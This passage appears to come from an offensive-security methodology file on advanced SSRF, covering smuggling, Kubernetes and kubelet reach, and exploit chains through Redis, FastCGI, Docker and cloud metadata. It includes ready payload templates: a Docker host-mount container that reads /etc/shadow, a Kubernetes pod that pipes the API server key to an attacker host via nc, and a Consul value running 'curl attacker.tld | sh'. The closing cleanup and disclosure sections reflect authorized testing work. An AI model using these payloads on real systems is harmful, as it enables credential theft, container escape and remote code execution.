- **CL.TE** — front (sink) uses `Content-Length`, back (downstream) uses `Transfer-Encoding: chunked`. Attacker sends both headers; sink reads N bytes; downstream reads chunked body; the "extra" bytes past N are interpreted by downstream as the start of a second request.
- **TE.CL** — reverse: front uses `Transfer-Encoding`, back uses `Content-Length`. Same shape, different disagreement.
- **TE.TE** — both use `Transfer-Encoding`, but one accepts a malformed header (`Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked` with space, `X: X\r\nTransfer-Encoding: chunked`) and the other rejects; the acceptor uses TE, the rejector uses CL.

### Smuggling from an SSRF sink

The class instance: SSRF sink is the "front" in the smuggling model. Attacker submits an SSRF payload whose body contains a smuggled second HTTP request. Sink forwards to the downstream; downstream parses the smuggled request as originating from the sink's identity — an authentication laundering.

**Route to `http_request_smuggling`** for the smuggling technique catalog in depth; this section documents the shape as an SSRF-adjacent primitive.

### Confirmation

- Time-based: smuggle a slow-response internal request; the sink's response is quick but the connection stays open longer than expected
- Differential: smuggle a request that would change the downstream's response to a subsequent legitimate request; the poison hits a different tenant if connection pooling is per-source

## Sink-Response Reflection Classes

Whether the sink echoes fetched content decides which oracles are available. Enumerating the reflection shape per sink is a distinct fingerprinting step.

### Full-response echo

- The sink returns the fetched response body verbatim (an image proxy for GIF/PNG, an HTML proxy for OpenGraph)
- Highest-fidelity oracle: OAST hit is confirmed and the fetched content is legible for content-verification (metadata JSON from IMDS is directly readable)

### Content-Type / Content-Length echo

- The sink echoes the fetched Content-Type header without the body (a size-limited preview, a MIME-type-only endpoint)
- Fingerprints internal services by their Content-Type: JSON `application/json` vs HTML `text/html` vs plain `text/plain`
- Content-Length echo is a numeric channel — reachable-service size fingerprint

### First-N-bytes / snippet echo

- OpenGraph preview extracts title/description from the first bytes; a `<title>` in the internal service's response leaks the service's identity
- The 4KB / 16KB / 64KB size limits per sink are engine-decided; probe by fetching a controlled endpoint that returns varying-size responses and observing what echoes back

### Metadata-only echo

- The sink extracts an image's EXIF, an archive's manifest, or a document's metadata; a controlled EXIF payload from the SSRF-fetched image reveals what the sink extracts and how it renders
- Some pipelines (imagemagick's `identify -verbose`) extract more than intended — the color profile, embedded thumbnails, and comments may all reach the sink's response

### No echo (blind)

- Sink returns 200/204 on success, 400/500 on failure; no body reflection
- Blind-channel oracles (timing, TLS handshake, cache) are the only path
- Documented as the shape that makes the reachability finding a category rather than a confirmed reach

## Kubernetes API and Kubelet Depth

The base file's Kubernetes note is one line. Depth per API surface:

### Kubernetes API (`kubernetes.default.svc`)

- Auth required (`Authorization: Bearer <SA token>`); token lives at `/var/run/secrets/kubernetes.io/serviceaccount/token` inside pods
- **`GET /api/v1/namespaces/<ns>/pods`** — pod list with container images, environment variables (often carrying secrets injected as env), volume mounts. The env vars are the highest-yield credential leak.
- **`POST /api/v1/namespaces/<ns>/pods`** — create a pod. If the SA has `create pods` on any namespace, an attacker pod with `hostNetwork:true, hostPID:true, containers: [{command: [/bin/sh, -c, "cat /etc/kubernetes/*"]}]` reads the control-plane secrets.
- **`GET /api/v1/namespaces/<ns>/secrets`** — secret list; each secret contains service credentials, TLS keys, cloud-provider credentials
- **`POST /api/v1/namespaces/<ns>/pods/<pod>/exec`** — exec into a running pod (requires SPDY/WebSocket upgrade; some SSRF sinks cannot do WebSocket upgrade)
- **RBAC recon**: `POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews` returns what the current SA can do — a critical enumeration step

Route the RBAC and multi-namespace lateral-movement discipline to `kubernetes`.

### Kubelet (per-node, `10250` or `10255`)

- `10255` (deprecated, unauth) — read-only; `/pods` lists local-node pods including secret env vars; `/metrics/cadvisor` includes container names
- `10250` (auth) — requires `Authorization: Bearer <SA token>` (system:node SA is preferred but many clusters accept any SA); `/exec/<ns>/<pod>/<container>?command=<cmd>&stdin=1` executes commands
- Kubelet endpoints require WebSocket upgrade for `/exec`, `/attach`, `/portForward` — SSRF sinks that don't support Upgrade are gated
- **`GET /pods`** on the kubelet returns rich pod metadata including secret env vars — a single unauth request to `:10255` grabs a node's worth of credentials

### Cluster metadata via kube-proxy / API endpoints

- **`/version`** — Kubernetes version
- **`/api`** — API groups; enumerates enabled operator/controller APIs (ArgoCD, Istio, Prometheus Operator)
- **`/openapi/v2`** — full API schema; identifies custom resources
- **`/apis/apiextensions.k8s.io/v1/customresourcedefinitions`** — CRDs; each is a chain candidate (an ArgoCD CRD leaks git repo tokens, a Vault CRD leaks Vault addresses)

## Chained-Primitive Exploitation

Modeled precondition/postcondition. Each entry names what capability grants the primitive (upstream) and what capability the primitive grants (downstream), routed by filename.

### SSRF → cloud credential (routed to `cloud/*`)

- **Upstream**: SSRF finding with controllables `{scheme=http, host=free, headers=free, method=free}` on a target running in AWS/GCP/Azure
- **Postcondition**: reach `http://169.254.169.254/` (or the provider's metadata IP); if the primitive can set headers/method, IMDSv2 token or GCP/Azure MSI token is extractable
- **Route**: `cloud/aws.md` for IMDSv2 PUT/token/hop-limit ordering; `cloud/gcp.md` for `Metadata-Flavor: Google` and SA token usage; `cloud/azure.md` for `Metadata: true` and MSI oauth2 token
- **Downstream**: cloud IAM role assumed, further cloud-service API access (S3, KMS, Secrets Manager, VPC control-plane)

### SSRF → gopher → Redis → RCE (routed to `rce`)

- **Upstream**: SSRF finding with controllables including `scheme=free` on a curl-backed sink (fingerprint the client first); Redis reachable at loopback or private IP; Redis unauth or attacker has the AUTH string
- **Primitive**: gopher payload constructed via Gopherus; write cron/authkey/webshell/module
- **Route**: `rce` owns post-exploitation ordering; the file-write primitive is the shape, the exec is the follow-through

### SSRF → gopher → FastCGI → RCE (routed to `rce`)

- **Upstream**: SSRF on curl-backed sink; PHP-FPM on `:9000` reachable at loopback or private IP; no `security.limit_extensions` restricting the extension
- **Primitive**: Gopherus FCGI record with `PHP_VALUE=auto_prepend_file=php://input` + PHP body → PHP execution
- **Route**: `rce` for post-exploitation

### SSRF → Docker daemon → container escape (routed to `rce` + `kubernetes`)

- **Upstream**: SSRF with controllables including `method=POST` and `body=free`; Docker daemon on `/var/run/docker.sock` (via `http+unix://`) or `:2375` (via HTTP) reachable
- **Primitive**: `POST /v1.24/containers/create` with `{"HostConfig":{"Binds":["/:/host"]}}` creates a container with the host filesystem mounted → attach + chroot → host-level RCE
- **Route**: `rce` for the post-exploitation; `kubernetes` when the Docker socket is inside a pod

### SSRF → Kubernetes API → lateral movement (routed to `kubernetes`)

- **Upstream**: SSRF finding inside a pod; SA token available (either via mounted filesystem read chained with `path_traversal_lfi_rfi`, or the sink automatically propagates the caller's headers including bearer token)
- **Primitive**: `Authorization: Bearer <SA token>` on requests to `https://kubernetes.default.svc/api/v1/...`
- **Route**: `kubernetes` for the RBAC ordering — namespace enumeration, pod exec, secret retrieval, cross-namespace lateral movement

### SSRF → oauth redirect abuse → token theft (routed to `oauth`)

- **Upstream**: SSRF via `redirect_uri` parameter on an OAuth authorization endpoint; the SSRF sink is the OAuth provider's callback URL validator
- **Primitive**: redirect the OAuth flow to attacker-controlled endpoint that captures the code/token; if the provider validates `redirect_uri` via a parser-differential (V-class), the validator sees an allowlisted host while the actual redirect goes to the attacker
- **Route**: `oauth` for the token-theft-and-forge follow-through; `open_redirect` for the redirect-class discipline

### SSRF → cross-service authenticated reach (routed to `broken_function_level_authorization`)

- **Upstream**: SSRF sink that propagates the caller's cookies/tokens to the outbound request (a proxy that adds `Authorization: Bearer <caller's token>` when the outbound is same-origin)
- **Primitive**: internal API called with the caller's credentials but from a different-authority context; horizontal or vertical escalation depending on the internal API's authorization model
- **Route**: `broken_function_level_authorization` for the object-vs-function authorization discipline

## Sink-Specific Payload Templates

Real-world SSRF sinks have per-sink payload construction requirements. Copy-adapt per target.

### Docker daemon (`/var/run/docker.sock` or `:2375`)

Container create with host filesystem mount:
```
POST /v1.24/containers/create HTTP/1.1
Host: docker
Content-Type: application/json
Content-Length: 176

{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host cat /etc/shadow"],"HostConfig":{"Binds":["/:/host"],"AutoRemove":true},"Tty":false}
```

Then `POST /v1.24/containers/<id>/start` and `POST /v1.24/containers/<id>/attach?stream=1&stdout=1`. The attach response streams the container's stdout — the chroot output reaches the SSRF sink's response body if reflection is full.

Via gopher for a curl-backed sink without POST-body support:
```
gopher://127.0.0.1:2375/_POST%20/v1.24/containers/create%20HTTP/1.1%0D%0AHost:%20docker%0D%0AContent-Type:%20application/json%0D%0AContent-Length:%20176%0D%0A%0D%0A{...JSON...}
```

### Kubernetes pod create for cluster admin escalation

Requires `create pods` on any namespace. Pod escapes to node by mounting host FS:
```
POST /api/v1/namespaces/default/pods HTTP/1.1
Authorization: Bearer <sa-token>
Content-Type: application/json

{
  "apiVersion":"v1","kind":"Pod",
  "metadata":{"name":"pwn"},
  "spec":{
    "hostNetwork":true,"hostPID":true,
    "containers":[{
      "name":"c","image":"alpine",
      "command":["/bin/sh","-c","cat /etc/kubernetes/pki/apiserver.key | nc <attacker> 1337"],
      "volumeMounts":[{"name":"host","mountPath":"/host"}]
    }],
    "volumes":[{"name":"host","hostPath":{"path":"/"}}]
  }
}
```

### HashiCorp Vault operations

```
GET /v1/auth/token/lookup-self HTTP/1.1
X-Vault-Token: <token>
```

Extract secrets:
```
GET /v1/secret/data/prod/database HTTP/1.1
X-Vault-Token: <token>
```

Sink must permit custom headers; Vault token from a previous credential-leak primitive (env var, ConfigMap read).

### Consul KV writes for persistence

```
PUT /v1/kv/config/nextRun HTTP/1.1
Content-Length: N

{"restart_command": "curl attacker.tld | sh"}
```

Persistence only if the target reads the KV on schedule.

### Redis cluster / Sentinel

Beyond loopback Redis: `dict://sentinel:26379/SENTINEL:MASTERS` enumerates masters; `SENTINEL FAILOVER <name>` triggers a failover if AUTH is unset — an availability-impact primitive.

### Elasticsearch dangerous ops

```
POST /_scripts/painless/pwn HTTP/1.1
Content-Type: application/json

{"script":{"lang":"painless","source":"..."}}
```

Then execute via a stored search that references the script. Painless is sandboxed but sandbox-escape CVEs surface periodically.

## SSRF-Adjacent Class Boundaries

Where SSRF ends and another class owns the finding.

### SSRF vs Open Redirect

- **SSRF** — the *server* fetches the URL
- **Open Redirect** — the *client's browser* is redirected via a Location header
- The finding is Open Redirect when the exploited effect is on the user's session (phishing landing, token theft via OAuth redirect); route to `open_redirect`
- The finding is SSRF when the exploited effect is server-side fetch reaching internal networks
- **Both classes can share a sink** — a `?next=<url>` parameter that (a) redirects the browser and (b) is fetched server-side for OpenGraph is exploitable as either class independently

### SSRF vs XXE

- **XXE** — the parser resolves external entities; the fetcher is inside an XML parser configured with resolve-external-entities enabled
- **SSRF** — the app makes an HTTP request
- XML that reaches an XXE-vulnerable parser can trigger XXE-shape SSRF (`<!ENTITY x SYSTEM "http://internal">`) as a side effect; route to `xxe` for the XML-specific technique catalog
- Overlapping shape: an SSRF sink that fetches XML and parses it downstream may cascade into XXE — chain both skills

### SSRF vs RCE (via protocol smuggling)

- SSRF is the outbound-request primitive
- RCE is the code execution that follows (Redis cron/webshell write, FastCGI PHP execution, Docker container create with mount)
- Route the exec-sink ordering to `rce`; the SSRF finding is the primitive, the RCE is the chain

### SSRF vs HTTP Request Smuggling

- SSRF sink forwards to a downstream — an attacker who controls the sink's forward-request body/headers can smuggle a second request through the connection
- Route to `http_request_smuggling` for the smuggling technique catalog
- The class boundary: single-request-reach is SSRF; multi-request-shape-in-one-connection is smuggling

### SSRF vs Cache Poisoning

- SSRF that reaches a caching layer (Varnish, CloudFront, sink's own cache) may poison the cache for subsequent users
- Route to `web_cache_deception` if the app has that skill; otherwise document the impact-adjacent finding

## Post-Exploitation State Discipline

Per-primitive rollback and cleanup — coordinate every step with the disclosure timeline.

### Redis writes (gopher-delivered)

Reverse each write shape:
```
# Cron entry undo:
DEL /var/spool/cron/root       (via a follow-up gopher payload) OR delete the file OOB

# Reset dir/dbfilename:
CONFIG SET dir /var/lib/redis
CONFIG SET dbfilename dump.rdb
DEL <key>
BGREWRITEAOF                    # collapse AOF history if AOF is on
```
FLUSHDB drops the whole current database — use only if the target explicitly authorized it (many production Redis carry live user data).

### Docker container creates

```
DELETE /v1.24/containers/<id>?force=true&v=true
DELETE /v1.24/networks/<id>     # if a network was created
DELETE /v1.24/volumes/<id>      # if a volume was created
```
Document the container name in the finding (`docker inspect <name>` is the reverse audit trail).

### Kubernetes resource creates

```
DELETE /api/v1/namespaces/<ns>/pods/pwn
DELETE /api/v1/namespaces/<ns>/services/pwn
DELETE /apis/apps/v1/namespaces/<ns>/deployments/pwn
DELETE /api/v1/namespaces/<ns>/configmaps/pwn
DELETE /api/v1/namespaces/<ns>/secrets/pwn
```
For cascading resources (Deployment → ReplicaSet → Pods), delete the top and use `propagationPolicy=Foreground`.

### Vault operations

- `POST /v1/auth/token/revoke-self` — revoke the token used for the test
- Any KV writes: overwrite with previous values (read-first, restore-second discipline) or `DELETE /v1/secret/data/<path>` if the value was created rather than modified
- Vault audit logs record every operation — the disclosure can cite specific request IDs

### Consul KV writes

- `DELETE /v1/kv/<key>` for each key created
- If a key was modified (not created), read the prior value before writing, restore after

### Cloud provider audit-log alignment

- **AWS** — every IMDS reach is logged if the cluster has instance-metadata logging enabled; every credential-usage step is in CloudTrail. Include the CloudTrail event IDs from the test window in the disclosure.
- **GCP** — Cloud Audit Logs capture every metadata read for authenticated APIs; the SA usage lineage is auditable.
- **Azure** — Activity Log for control-plane; Storage Analytics for data-plane if enabled.
- **Kubernetes** — API server audit log records every API call; kubelet audit is separate and often off by default.

### Nonce discipline

Every payload documented in the finding uses a per-request nonce (in the OAST hostname, in the injected URL path, in the Docker container name, in the Kubernetes resource name). Nonces let the target's team distinguish test traffic from actual attacks:
- OAST domain: `t<test-id>-<seq>.oast.fun`
- Injected path: `/pwn-<test-id>-<seq>/`
- Container/resource name: `pwn-<test-id>-<seq>`

Store the nonce → payload → time table for cross-reference with the target's logs.

### Coordinated disclosure

- Announce testing windows to the target's team before firing metadata/gopher/Docker/K8s payloads
- Test-window announcements let the target's monitoring de-emphasize test traffic and suppress false-positive incident-response
- After the test: hand over the nonce table, the OAST hits, the payload catalog. The target's team can audit the exact scope of the test in their logs.

## Overlap Notes

- **The alternate-IP-form and V-class parser-differential measured matrices** live in the base file. This file references them without re-listing. Cross-language depth (Python/Node/Rust/Go per-library differences) lives in `ssrf_novel_deep.md`.
- **Per-provider metadata extraction gate** — reach lives here; the extraction ordering (IMDSv2 PUT, token TTL, hop-limit fingerprinting, header supply) lives in `cloud/*` per the base file's scope discipline.
- **Busboy multipart parser-differential class** — canonical block placement here (this file). Base files of `xss`/`rce`/`sql_injection`/`ssrf` reference this section by filename. Novel sibling cites the researcher-writeup instance (CVE labels stripped after §2 retroactive verification revealed a mismap).
- **DNS-rebinding TOCTOU** — general methodology here; the 2026 Craft CMS CVE-2026-27127 specific instance lives in `ssrf_novel_deep.md`.
- **`http+unix://` and Node UDS reach** — class here; the specific Node CVE-2026-21636 permission-model bypass lives in `ssrf_novel_deep.md`.
- **WAF-provider technique posture** — cloud-WAF specific classes live in `ssrf_novel_deep.md`; durable class-shape bypasses live here.
- **Protocol smuggling** — gopher/dict/file/UDS reach coverage lives here; Redis 7+ ACL fingerprinting and PHP-FPM `security.limit_extensions` are documented here as gates.

## Testing Depth Checklist

- [ ] Sink's HTTP client fingerprinted (curl/Node/Python/Go/Java/Rust — decides scheme reach and rebinding susceptibility)
- [ ] Six controllables named (scheme, host, port, path, headers, method, body)
- [ ] Alternate IP forms probed per the base-file client matrix
- [ ] Backslash-in-authority (V-class) parser differential probed if target is Python + `requests`/`urllib3`
- [ ] Userinfo (`@`) and fragment (`#`) parser-differential probes fired
- [ ] IDN/punycode/IPv6 zone-index parser probes fired
- [ ] Redirect-following default confirmed for the fetcher; if follows, allowlist-single-hop bypass fired
- [ ] DNS rebinding attempt via Singularity/rbndr — winning flip confirmed or ruled out
- [ ] Per-library DNS-pinning behavior fingerprinted (`CURLOPT_RESOLVE` presence, `Session` reuse, JVM `networkaddress.cache.ttl`)
- [ ] Gopher scheme probed on curl-backed sinks; Redis/FCGI reach mapped
- [ ] `http+unix://` reach probed for Docker/K8s socket
- [ ] Metadata endpoint reach probed with the provider's required header — extraction gate satisfied or documented as reach-only
- [ ] Kubernetes SA token acquisition path assessed (mounted FS read, propagated caller headers, or unavailable)
- [ ] WAF fingerprinted (headers/response shape); multipart parser-differential attempt if Node/Busboy stack
- [ ] Statistical timing baseline established for blind extraction (control samples + MAD)
- [ ] Rollback plan documented for every write-shape confirmation
- [ ] Nonce discipline honored — OAST hostname per-request; payloads correlated back to injection point

## Summary

Advanced SSRF is disciplined parser and resolver fingerprinting, naming the metadata extraction gate that decides whether reach becomes credential extraction, and routing each capability hand-off by filename. The canonical Busboy multipart parser-differential class lives here and is referenced across `xss`/`rce`/`sql_injection`/`ssrf`. Where the base's primitives don't land against WAF, DNS pinning, or a rebinding-resistant validator, the depth here does; the novel sibling owns the 2024–2026 instances these classes generalize.
